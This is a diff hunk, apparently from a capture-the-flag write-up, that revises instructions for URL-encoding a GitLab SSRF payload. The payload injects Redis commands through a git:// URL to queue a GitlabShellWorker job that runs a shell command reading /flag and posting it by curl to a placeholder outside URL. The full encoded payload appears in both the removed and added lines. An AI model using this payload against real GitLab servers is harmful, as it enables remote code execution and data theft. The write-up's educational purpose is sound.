@@ -65,8 +65,8 @@ git://[0:0:0:0:0:ffff:127.0.0.1]:6379/
 /ssrf.git
 ```
 
-Then finally, we encode the above using a [URL Encoded](https://meyerweb.com/eric/tools/dencoder/).
+Then finally, we encode the above using a [URL Encoder](https://meyerweb.com/eric/tools/dencoder/). Note that we will only be encoding the payload (which includes the blanks at the beginning and the linebreaks), and not the first and last line. You will also need to change all `%0A` to `%0D%0A`.
 
 ```text
-git%3A%2F%2F%5B0%3A0%3A0%3A0%3A0%3Affff%3A127.0.0.1%5D%3A6379%2F%0A%20multi%0A%20sadd%20resque%3Agitlab%3Aqueues%20system_hook_push%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem_hook_push%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class_eval%5C%22%2C%5C%22open(%5C%27%7Ccat%20%2Fflag%20%7C%20curl%20-H%20%22Content-Type%3A%20application%2Fjson%22%20-X%20POST%20--data-binary%20%40-%20%3CURL%20HERE%3E%5C%27).read%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system_hook_push%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created_at%5C%22%3A1513714403.8122594%2C%5C%22enqueued_at%5C%22%3A1513714403.8129568%7D%22%0A%20exec%0A%20exec%0A%2Fssrf.git
+git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system_hook_push%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem_hook_push%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class_eval%5C%22%2C%5C%22open(%5C%27%7Ccat%20%2Fflag%20%7C%20curl%20-H%20%22Content-Type%3A%20application%2Fjson%22%20-X%20POST%20--data-binary%20%40-%20%3CURL%20HERE%3E%5C%27).read%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system_hook_push%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created_at%5C%22%3A1513714403.8122594%2C%5C%22enqueued_at%5C%22%3A1513714403.8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf.git
 ```
